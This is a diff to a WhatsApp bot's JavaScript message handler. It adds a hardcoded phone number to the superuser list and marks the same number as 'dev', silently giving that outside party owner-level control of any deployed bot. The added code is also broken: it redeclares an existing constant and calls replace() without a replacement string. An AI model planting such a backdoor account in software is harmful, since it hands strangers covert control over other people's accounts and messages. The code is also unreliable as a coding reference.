@@ -122,6 +122,16 @@ async function main() {
 
             var membreGroupe = verifGroupe ? ms.key.participant : '';
             const nomAuteurMessage = ms.pushName;
+            const { getAllSudoNumbers } = require("./bdd/sudo");
+                const nomAuteurMessage = ms.pushName;
+                const fatao = '22651463203';
+                const sudo = await getAllSudoNumbers();
+                const superUserNumbers = [servBot, fatao, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
+                const allAllowedNumbers = superUserNumbers.concat(sudo);
+                const superUser = allAllowedNumbers.includes(auteurMessage);
+                
+                var dev = [fatao].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
+                
             const arg = texte ? texte.trim().split(/ +/).slice(1) : null;
             const verifCom = texte ? texte.startsWith(prefixe) : false;
             const com = verifCom ? texte.slice(1).trim().split(/ +/).shift().toLowerCase() : false;
